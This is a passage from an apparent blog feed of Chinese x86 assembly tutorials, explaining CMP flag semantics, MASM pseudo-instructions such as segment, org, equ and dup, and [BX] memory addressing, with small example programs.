= 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果 ax &#x3D; bx，则 ax - bx &#x3D; 0，ZF &#x3D; 1<br>如果 ax ≠ bx，则 ax - bx ≠ 0，ZF &#x3D; 0<br>如果 ax &lt; bx，则 ax - bx &lt; 0，将产生借位，CF &#x3D; 1，ZF &#x3D; 0<br>如果 ax &gt; bx，则 ax - bx &gt; 0，不必借位，CF &#x3D; 0，ZF &#x3D; 0</p><blockquote><p><strong>注意：<br>SF 位记录结果是否为负，但执行 <code>cmp ax, bx</code> 后 SF &#x3D; 1 并不能说明 ax &lt; bx</strong></p></blockquote><ul><li>例如：两个有符号数进行减法运算</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">ah <span class="token operator">=</span> 22hbh <span class="token operator">=</span> 0A0hsub ah<span class="token punctuation">,</span> bh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>$[22h]_补$ &#x3D; 00100010<br>$[-0A0h]_补$ &#x3D; 01100000</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">  <span class="token number">00100010</span><span class="token operator">+</span> <span class="token number">01100000</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>  <span class="token number">10000010</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里 10000010b &#x3D; 82h，即 22h - 0A0h &#x3D; 34 - (-96) &#x3D; 130 &#x3D; 82h（注意：82h 是 -126 的补码）<br>计算结果为负，所以 SF &#x3D; 1<br>但明显 34 &gt; -96</p><blockquote><p>因此，<strong>单独根据 SF 来判断结果是否为负显然不对，原因在于计算过程中可能会发生溢出</strong></p><p>执行 <code>cmp ax, bx</code> 后，若要说明 ax &lt; bx，需结合 SF 和 OF 来判断：</p><ol><li><code>SF = 1，OF = 0</code><br>① OF &#x3D; 0 说明没有溢出，计算结果的正负 &#x3D; 真正结果的正负<br>② SF &#x3D; 1 说明计算的结果为负<br>③ 所以，真正的结果为负，ax &lt; bx</li><li><code>SF = 1，OF = 1</code><br>① OF &#x3D; 1 说明溢出，计算结果的正负 ≠ 真正结果的正负<br>② SF &#x3D; 1 说明计算的结果为负<br>③ 所以，由于溢出导致了计算的结果为负，则真正的结果为正，ax &gt; bx</li><li><code>SF = 0，OF = 1</code><br>① OF &#x3D; 1 说明溢出，计算结果的正负 ≠ 真正结果的正负<br>② SF &#x3D; 0 说明计算的结果为非负，有溢出说明计算的结果非 0，因此计算的结果为正<br>③ 所以，由于溢出导致了计算的结果为正，则真正的结果为负，ax &lt; bx</li><li><code>SF = 0，OF = 0</code><br>① OF &#x3D; 0 说明没有溢出，计算结果的正负 &#x3D; 真正结果的正负<br>② SF &#x3D; 0 说明计算的结果为非负<br>③ 所以，真正的结果为非负，ax ≥ bx</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 汇编语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> x86汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编程序设计</title>
      <link href="/posts/7aedea61.html"/>
      <url>/posts/7aedea61.html</url>
      
        <content type="html"><![CDATA[<h1 id="汇编程序"><a href="#汇编程序" class="headerlink" title="汇编程序"></a>汇编程序</h1><blockquote><p>汇编程序的全过程：<br><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%B1%87%E7%BC%96%E7%A8%8B%E5%BA%8F1.png" alt="x86汇编_汇编程序1.png"></p></blockquote><ul><li>汇编程序示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesgcodesg segmentmov ax<span class="token punctuation">,</span> 0123hmov bx<span class="token punctuation">,</span> 0456hadd ax<span class="token punctuation">,</span> bxadd ax<span class="token punctuation">,</span> axmov ax<span class="token punctuation">,</span> 4C00hint 21hcodesg endsend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>编译连接后生成的可执行 <code>.exe</code> 文件主要包含两部分内容：</p><ol><li><strong>程序</strong>（<em>从源程序中的汇编指令翻译过来的机器码</em>）和<strong>数据</strong>（<em>源程序中定义的数据</em>）</li><li><strong>相关的描述信息</strong>（<em>程序的大小、内存空间的占用等</em>）</li></ol></blockquote><hr><h1 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h1><blockquote><p>在汇编语言中，有两种指令：汇编指令、伪指令</p><p><strong>汇编指令</strong>：有对应的机器码的指令，可以被编译为机器指令，最终被 CPU 执行<br><strong>伪指令</strong>：没有对应的机器指令，不会被 CPU 执行，由编译器来执行</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E4%BC%AA%E6%8C%87%E4%BB%A41.png" alt="x86汇编_伪指令1.png"></p><hr><h2 id="segment-和-ends"><a href="#segment-和-ends" class="headerlink" title="segment 和 ends"></a>segment 和 ends</h2><blockquote><p><code>segment</code> 和 <code>ends</code> 是一对成对使用的伪指令，是写汇编程序必需要用到的</p></blockquote><ul><li><code>segment</code> 说明一个段开始，<code>ends</code> 说明一个段结束，一个段必须要有一个名称来标识</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">段名 segment ......段名 ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>一个汇编程序由多个段组成（分别用于划分指令、数据、栈），并且一个有意义的汇编程序至少要有一个段（代码段）</li></ul><blockquote><p>注意不要弄混 <code>ends</code> 和 <code>end</code><br><strong>ends 表示一个段的结束，与 segment 配对使用（ends 可以理解为 end segment）</strong><br><strong>end 表示整个程序的结束</strong></p></blockquote><hr><h2 id="proc-和-endp"><a href="#proc-和-endp" class="headerlink" title="proc 和 endp"></a>proc 和 endp</h2><blockquote><p>proc 指令可以用于子程序的定义。将具有某种功能的程序段看作一个过程（子程序），它可以被别的程序调用（<code>call</code>），类似于 C 语言的函数</p></blockquote><ul><li><strong>proc 中属性 <code>near</code> 和 <code>far</code> 决定调用程序和子程序是否在同一代码段</strong></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">过程名 proc near<span class="token operator">/</span>far...ret过程名 endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="left">属性</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>near</code>（段内近调用）</td><td align="left">调用程序和子程序在同一代码段中，只能被相同代码段的其他程序调用</td></tr><tr><td align="left"><code>far</code>（段间远调用）</td><td align="left">调用程序和子程序不在同一代码段中，可以被相同或不同代码段的程序调用</td></tr></tbody></table><hr><h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2><blockquote><p><strong>汇编结束命令</strong>。该伪指令是汇编语言结束的标志，对于在 <code>end</code> 之后的汇编指令不予处理，不和其他伪指令成对使用，且只可以有一个 <code>end</code> 指令，否则编译器会报错</p></blockquote><hr><h2 id="org"><a href="#org" class="headerlink" title="org"></a>org</h2><blockquote><p><strong>汇编起始指令</strong>。<code>org</code> 可以用于规定该伪指令下面的程序数据的起始偏移地址，数据被连续存放在此后的地址内，直到下一条 <code>org</code> 指令为止</p><p><em>汇编程序中若没有 <code>org</code> 伪指令，则程序执行时，指令代码被放到自由内存空间的 CS:0 处；若有 <code>org</code> 伪指令，则编译器把其后的指令代码放到 org 伪指令指定的偏移地址处</em>。两个 <code>org</code> 伪指令之间，除了指令代码，若有自由空间，则用 0 填充</p><p><code>org</code> 指令可放在程序的任何位置。但是注意：**<code>org</code> 指令按出现的顺序其后的地址必须依次增大，且不能重叠，否则编译器可能报错**</p></blockquote><ul><li><p>用法：<code>org  16位地址</code></p></li><li><p>示例：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:datadata segmentorg 1500hTest1 db 12h<span class="token punctuation">,</span> 34h   <span class="token comment">; Test1 变量的偏移地址为 1500h，即：ds:1500</span>org 3000hTest2 dw 3040h<span class="token punctuation">,</span> 2830h   <span class="token comment">; Test2 变量的偏移地址为 3000h，即：ds:3000</span>data endscode segmentorg 200h   <span class="token comment">; 此段代码段起始地址偏移量为 200h，即：cs:200</span>start:mov ax<span class="token punctuation">,</span> datamov ds<span class="token punctuation">,</span> axmov ax<span class="token punctuation">,</span> 4C00hint 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Debug 测试：</li></ul><ol><li>可以看到不加 <code>org 200h</code> 时，程序入口从 CS:0 开始：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E4%BC%AA%E6%8C%87%E4%BB%A4-org2.png" alt="x86汇编_伪指令-org2.png"></p><p>加上 <code>org 200h</code> 后，将程序入口的偏移地址从 CS:0 修改到 CS:200 处：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E4%BC%AA%E6%8C%87%E4%BB%A4-org1.png" alt="x86汇编_伪指令-org1.png"></p><ol start="2"><li>可以看到不加 <code>org 1500h</code> 和 <code>org 3000h</code> 时，Test1 和 Test2 从 DS:0 处依次存放：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E4%BC%AA%E6%8C%87%E4%BB%A4-org3.png" alt="x86汇编_伪指令-org3.png"></p><p>加上 <code>org 1500h</code> 和 <code>org 3000h</code> 后</p><p>Tset1 被存放在 DS:1500 处，Test2 被存放在 DS:3000 处：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E4%BC%AA%E6%8C%87%E4%BB%A4-org4.png" alt="x86汇编_伪指令-org4.png"></p><hr><h2 id="equ"><a href="#equ" class="headerlink" title="equ"></a>equ</h2><blockquote><p><strong>代码替换指令</strong>。类似于 C 语言中的 <code>#define</code>，<code>equ</code> 可以用于把一个符号名称与一个整数表达式或一个任意文本连接起来</p><p>用法：<code>名字 EQU 表达式</code></p></blockquote><ul><li>equ 指令的使用大致有三种，当汇编器在程序后面遇到 <code>name</code> 时，它就用整数值或文本来代替符号：<ol><li><code>name equ expression</code>，expression 必须是一个有效整数表达式</li><li><code>name equ symbol</code>，symbol 是一个已存在的符号名称，已经用 &#x3D; 或 equ 定义过了</li><li><code>name equ &lt;text&gt;</code>，任何文本都可以岀现在 &lt;······&gt; 内</li></ol></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token comment">; 以下指令等价于 mov cx, [bx + si]</span>s equ bx<span class="token operator">+</span>si  mov cx，<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>word1 equ this word   <span class="token comment">; 给后面的字节存储单元取一个字属性的符号名</span>byte1 db 12h<span class="token punctuation">,</span> 21hflag dw 1234hflag1 equ byte ptr flag   <span class="token comment">; 给 flag 的低字节取一个字节属性的符号名</span>flag2 equ byte ptr flag <span class="token operator">+</span> <span class="token number">1</span>   <span class="token comment">; 给 flag 的高字节取一个字节属性的符号名</span><span class="token comment">; 有了上述定义后，可编写如下语句：</span>mov ax<span class="token punctuation">,</span> word1   <span class="token comment">; 执行后，(ax) = 2112h</span>mov bl<span class="token punctuation">,</span> flag1   <span class="token comment">; 执行后，(bl) = 34h</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>pressKey equ <span class="token operator">&lt;</span><span class="token string">"Press any key to continue..."</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">></span><span class="token instruction keyword">PI</span> equ <span class="token operator">&lt;</span><span class="token number">3.1415926</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="assume"><a href="#assume" class="headerlink" title="assume"></a>assume</h2><blockquote><p><code>assume</code> 表示假设，它假设某一段寄存器和程序中的某一个 <code>segment</code> 段相关联</p></blockquote><ul><li>例如，定义一个段 codesg，如果这个段我想用来存放代码，那么它就是一个代码段，但是编译器并不知道我想用来作为代码段，所以需要使用 <code>assume</code> 来假设</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesg   <span class="token comment">; 将 codesg 段与 cs 段寄存器关联起来</span>codesg segment......codesg ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="db-x2F-dw-x2F-dd-x2F-df-x2F-dq-x2F-dt"><a href="#db-x2F-dw-x2F-dd-x2F-df-x2F-dq-x2F-dt" class="headerlink" title="db&#x2F;dw&#x2F;dd&#x2F;df&#x2F;dq&#x2F;dt"></a>db&#x2F;dw&#x2F;dd&#x2F;df&#x2F;dq&#x2F;dt</h2><blockquote><p>db、dw、dd、df、dq、dt 用于定义数据类型，区别在于每一个数据的长度不一样，占用大小不一样</p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">每个数据占用大小</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>db</code></td><td align="left">1 字节</td><td align="left"><code>db 1Ah, 2Bh, 3Ch, 4Dh, 5Eh, 6Fh, 77h, 88h, 99h, 00h</code></td></tr><tr><td align="left"><code>dw</code></td><td align="left">2 字节</td><td align="left"><code>dw 1A2Bh, 3C4Dh, 5E6Fh, 7788h, 9900h</code></td></tr><tr><td align="left"><code>dd</code></td><td align="left">4 字节</td><td align="left"><code>dd 1A2B3C4Dh, 5E6F7788h</code></td></tr><tr><td align="left"><code>df</code></td><td align="left">6 字节</td><td align="left"><code>df 1A2B3C4D5E6Fh</code></td></tr><tr><td align="left"><code>dq</code></td><td align="left">8 字节</td><td align="left"><code>dq 1A2B3C4D5E6F7788h</code></td></tr><tr><td align="left"><code>dt</code></td><td align="left">10 字节</td><td align="left"><code>dt 1A2B3C4D5E6F77889900h</code></td></tr></tbody></table><ul><li>示例</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">data segmentdb <span class="token number">1</span>dw <span class="token number">1</span>dd <span class="token number">1</span>data ends<span class="token number">01</span>  <span class="token number">01</span>  <span class="token number">00</span>  <span class="token number">01</span>  <span class="token number">00</span>  <span class="token number">00</span>  <span class="token number">00</span>  <span class="token number">00</span>  <span class="token number">00</span>  <span class="token number">00</span>  <span class="token number">00</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个数据为：01h，在 <code>data:0</code> 处，占 1 个字节<br>第一个数据为：0001h，在 <code>data:1</code> 处，占 1 个字，2 个字节<br>第一个数据为：00000001h，在 <code>data:3</code> 处，占 2 个字，4 个字节</p><hr><h2 id="dup"><a href="#dup" class="headerlink" title="dup"></a>dup</h2><blockquote><p><code>dup</code> 是一个操作符，与 db、dw、dd 一样，由编译器识别处理</p><p><strong>dup 与 db、dw、dd 等数据定义伪指令配合使用，用来进行数据的重复</strong></p></blockquote><ul><li>用法：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">db 重复的次数 dup （重复的字节型数据）dw 重复的次数 dup （重复的字型数据）dd 重复的次数 dup （重复的双字型数据）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">db <span class="token number">3</span> dup <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">; 定义了 3 个字节，每个字节值都为 0，相当于 db 0, 0, 0</span>db <span class="token number">3</span> dup<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">; 定义了 9 个字节，相当于 db 0, 1, 2, 0, 1, 2, 0, 1, 2</span>db <span class="token number">3</span> dup<span class="token punctuation">(</span><span class="token char">'abc'</span><span class="token punctuation">,</span> <span class="token char">'ABC'</span><span class="token punctuation">)</span><span class="token comment">; 定义了 18 个字节，相当于 db 'abcABCabcABCabcABC'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="type-x2F-seg-x2F-length-x2F-size-x2F-offset"><a href="#type-x2F-seg-x2F-length-x2F-size-x2F-offset" class="headerlink" title="type&#x2F;seg&#x2F;length&#x2F;size&#x2F;offset"></a>type&#x2F;seg&#x2F;length&#x2F;size&#x2F;offset</h2><table><thead><tr><th align="left">用法</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>type 变量名</code></td><td align="left">获取变量的类型，如果是 db 定义的则为 1，dw 定义的则为 2，以此类推</td></tr><tr><td align="left"><code>seg 变量名</code></td><td align="left">获得变量的段地址</td></tr><tr><td align="left"><code>length 变量名</code></td><td align="left">如果变量是 dup 复制的，返回分配的单元数，其他情况都为 1，但是嵌套的 dup 复制的数据不能据此得到正确的变量数</td></tr><tr><td align="left"><code>size 变量名</code></td><td align="left">size &#x3D; type * length</td></tr><tr><td align="left"><code>offset 变量名</code></td><td align="left">获得变量的偏移地址</td></tr></tbody></table><ul><li>示例 1：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesg<span class="token punctuation">,</span> ds:datasegdataseg segment    str db 'hello'    arry db '4ss1du0us'dataseg endscodesg segmentstart:    mov ax<span class="token punctuation">,</span> dataseg    mov ds<span class="token punctuation">,</span> ax    mov bx<span class="token punctuation">,</span> type str   <span class="token comment">; bx = 1</span>    mov bx<span class="token punctuation">,</span> seg arry   <span class="token comment">; bx = (ds)</span>    mov bx<span class="token punctuation">,</span> size str   <span class="token comment">; bx = 1</span>    mov bx<span class="token punctuation">,</span> offset arry   <span class="token comment">; bx = 5</span>mov ax<span class="token punctuation">,</span> 4c00hint 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Debug 测试 1：</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E4%BC%AA%E6%8C%87%E4%BB%A4-type1.png" alt="x86汇编_伪指令-type1.png"></p><ul><li>示例 2：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:codesgcodesg segmentstart:    mov ax<span class="token punctuation">,</span> offset start   <span class="token comment">; 标号 start 偏移地址为 0</span>s:    mov ax<span class="token punctuation">,</span> offset s   <span class="token comment">; 标号 s 偏移地址为 3，第一条指令长度为 3 字节</span>mov ax<span class="token punctuation">,</span> 4c00hint 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Debug 测试 2：</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E4%BC%AA%E6%8C%87%E4%BB%A4-type2.png" alt="x86汇编_伪指令-type2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E4%BC%AA%E6%8C%87%E4%BB%A4-type3.png" alt="x86汇编_伪指令-type3.png"></p><hr><h2 id="byte-x2F-word-x2F-dword"><a href="#byte-x2F-word-x2F-dword" class="headerlink" title="byte&#x2F;word&#x2F;dword"></a>byte&#x2F;word&#x2F;dword</h2><blockquote><p>byte、word、dword 用于对存储单元的类型进行规定</p></blockquote><ul><li>示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov byte ptr <span class="token punctuation">[</span>di<span class="token punctuation">]</span><span class="token punctuation">,</span> 00h   <span class="token comment">; 使 DI 所指向的字节单元清 0</span>mov word ptr <span class="token punctuation">[</span>1000h<span class="token punctuation">]</span><span class="token punctuation">,</span> 00h   <span class="token comment">; 使 ds:1000 所指向的字单元清 0</span>jmp dword ptr <span class="token punctuation">[</span>2000h<span class="token punctuation">]</span>   <span class="token comment">; 使程序跳转到 ds:2000 开始的 2 个字单元对应的转移地址处</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="一些约定符号"><a href="#一些约定符号" class="headerlink" title="一些约定符号"></a>一些约定符号</h1><h2 id="描述符号"><a href="#描述符号" class="headerlink" title="描述符号 ()"></a>描述符号 ()</h2><blockquote><p>为了描述简洁，可以使用一个描述性符号 <code>&quot;()&quot;</code> 来表示一个寄存器或一个内存单元中的内容</p></blockquote><ul><li><p>例如：<br><code>(ax)</code> 表示 ax 寄存器中的内容<br><code>(al)</code> 表示 al 寄存器中的内容<br><code>(2000h)</code> 表示内存 20000h 单元的内容【() 中的内存单元的地址为物理地址】</p></li><li><p>在 <code>&quot;()&quot;</code> 中的元素可以有三种类型：<br>① <strong>寄存器名</strong>；② <strong>段寄存器名</strong>；③ <strong>内存单元的物理地址（一个 20 位数据）</strong></p></li><li><p>用 <code>&quot;()&quot;</code> 所表示的数据可以有两种类型：<br>① <strong>字节型</strong>；② <strong>字型</strong><br>数据类型由寄存器名或具体的计算决定，例如：<br><code>(al)</code> 为字节型；<code>(ax)</code> 为字型；<br><code>(al) = (20000h)</code>，则 <code>(20000h)</code> 得到的是字节型；<br><code>(ax) = (20000h)</code>，则 <code>(20000h)</code> 得到的是字型</p></li></ul><hr><h2 id="常量符号-idata"><a href="#常量符号-idata" class="headerlink" title="常量符号 idata"></a>常量符号 idata</h2><blockquote><p>为了方便，用 <code>idata</code> 表示常量</p></blockquote><ul><li>例如：<br><code>mov ax, [idata]</code> 就代表 <code>mov ax, [1]</code>、<code>mov ax, [2]</code>、<code>mov ax, [3]</code> 等<br><code>mov bx, idata</code> 就代表 <code>mov bx, 1</code>、<code>mov bx, 2</code>、<code>mov bx, 3</code> 等</li></ul><hr><h1 id="访问内存单元"><a href="#访问内存单元" class="headerlink" title="访问内存单元"></a>访问内存单元</h1><h2 id="BX"><a href="#BX" class="headerlink" title="[BX]"></a>[BX]</h2><blockquote><p><code>[BX]</code> 表示一个内存单元，它的<strong>偏移地址在 BX 中，段地址默认在 DS 中</strong></p></blockquote><ul><li>内存单元的长度（类型）可以由具体指令中的其他操作对象指出：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>  <span class="token comment">; 将一个内存单元的内容送入ax，这个内存单元长度为2字节（字单元）</span>mov al<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>  <span class="token comment">; 将一个内存单元的内容送入al，这个内存单元长度为1字节（字节单元）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>利用 <code>[BX]</code> 进行数据的传送：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token comment">; bx中存放的数据作为偏移地址EA，段地址SA默认在DS中</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token comment">; 将 SA:EA 处的数据送入ax，即：(ax) = ((ds) * 16 + (bx))</span>mov <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> ax<span class="token comment">; 将ax中的数据送入 SA:EA 处，即：((ds) * 16 + (bx)) = (ax)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>执行如下代码，内存中的变化如图：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 2000hmov ds<span class="token punctuation">,</span> axmov bx<span class="token punctuation">,</span> 1000hmov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>inc bxinc bxmov <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> axinc bxinc bxmov <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> axinc bxmov <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> alinc bxmov <span class="token punctuation">[</span>bx<span class="token punctuation">]</span><span class="token punctuation">,</span> al<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%5BBX%5D%E5%92%8Cloop1.jpg" alt="x86汇编_BX和loop1.jpg"></p><blockquote><p><strong>注意，编译器和 Debug 对 <code>mov al, [idata]</code> 这类指令的解释是不同的</strong>：</p><ol><li>编译器将 <code>[idata]</code> 解释为常数 idata</li><li>Debug 将 <code>[idata]</code> 解释为一个内存单元，idata 是内存单元的偏移地址</li></ol><p>在源程序中访问 <code>2000:0</code> 内存单元的两种方法：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 2000h  mov ds<span class="token punctuation">,</span> ax <span class="token comment">; 段地址 2000h 送入ds  </span>mov bx<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token comment">; 偏移地址 0 送入bx  </span>mov al<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span> <span class="token comment">; ds:bx 单元中的数据送入al</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 2000h  mov ds<span class="token punctuation">,</span> ax <span class="token comment">; 段地址2000h送入ds  </span>mov al<span class="token punctuation">,</span> ds:<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment">; ds:[0] 单元中的数据送入al</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p>汇编源程序中一些指令的含义：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment">; (al) = 0，将常量 0 送入 al，与 mov al, 0 含义相同  